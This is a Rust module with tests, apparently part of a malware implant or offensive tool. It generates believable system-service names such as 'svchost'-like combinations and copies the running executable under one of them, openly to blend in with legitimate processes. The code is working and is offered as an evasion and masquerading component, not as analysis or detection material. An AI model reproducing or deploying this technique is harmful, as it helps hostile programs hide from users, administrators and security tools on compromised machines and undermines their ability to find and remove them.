//! Polymorphic process naming.
//!
//! Generates plausible system-service names and can relocate the binary
//! under a randomized name to blend in with legitimate system processes.

use std::path::{Path, PathBuf};

/// Prefix word-list — common system-service prefixes across Windows/Linux.
const PREFIXES: &[&str] = &[
    "svc", "sys", "wmi", "dbus", "update", "runtime", "helper", "service", "daemon", "monitor",
];

/// Suffix word-list — common system-service suffixes.
const SUFFIXES: &[&str] = &[
    "host", "mgr", "ctl", "d", "worker", "agent", "proc", "handler",
];

/// Generate a randomized process name that looks like a system service.
///
/// Uses a simple hash of the current PID and time so the name is
/// deterministic within a single run but varies across invocations.
pub fn generate_process_name() -> String {
    let seed = std::process::id() as u64
        ^ std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u64;

    let prefix = PREFIXES[(seed % PREFIXES.len() as u64) as usize];
    let suffix = SUFFIXES[((seed / 7) % SUFFIXES.len() as u64) as usize];
    format!("{prefix}{suffix}")
}

/// Copy the current binary to `target_dir` with a randomized name.
///
/// Returns the new path, or `None` if the copy failed.
pub fn relocate_with_random_name(target_dir: &Path) -> Option<PathBuf> {
    let name = generate_process_name();
    let exe = std::env::current_exe().ok()?;

    #[cfg(target_os = "windows")]
    let new_path = target_dir.join(format!("{name}.exe"));
    #[cfg(not(target_os = "windows"))]
    let new_path = target_dir.join(&name);

    std::fs::copy(&exe, &new_path).ok()?;

    // Set executable permission on Unix.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&new_path, std::fs::Permissions::from_mode(0o755));
    }

    Some(new_path)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_process_name_not_empty() {
        let name = generate_process_name();
        assert!(!name.is_empty());
    }

    #[test]
    fn test_generate_process_name_has_valid_prefix() {
        let name = generate_process_name();
        let has_prefix = PREFIXES.iter().any(|p| name.starts_with(p));
        assert!(has_prefix, "name '{}' should start with a known prefix", name);
    }

    #[test]
    fn test_generate_process_name_has_valid_suffix() {
        let name = generate_process_name();
        let has_suffix = SUFFIXES.iter().any(|s| name.ends_with(s));
        assert!(has_suffix, "name '{}' should end with a known suffix", name);
    }

    #[test]
    fn test_relocate_with_random_name() {
        let dir = tempfile::tempdir().unwrap();
        // relocate_with_random_name copies the current test binary.
        let result = relocate_with_random_name(dir.path());
        assert!(result.is_some(), "relocate should succeed");
        let new_path = result.unwrap();
        assert!(new_path.exists(), "relocated binary should exist");

        // Verify it has a valid generated name (no extension on Linux).
        let file_name = new_path.file_name().unwrap().to_str().unwrap();
        let has_prefix = PREFIXES.iter().any(|p| file_name.starts_with(p));
        assert!(has_prefix, "relocated file '{}' should have a known prefix", file_name);
    }

    #[test]
    fn test_relocate_bad_dir_returns_none() {
        let result = relocate_with_random_name(Path::new("/nonexistent/path/does/not/exist"));
        assert!(result.is_none());
    }
}
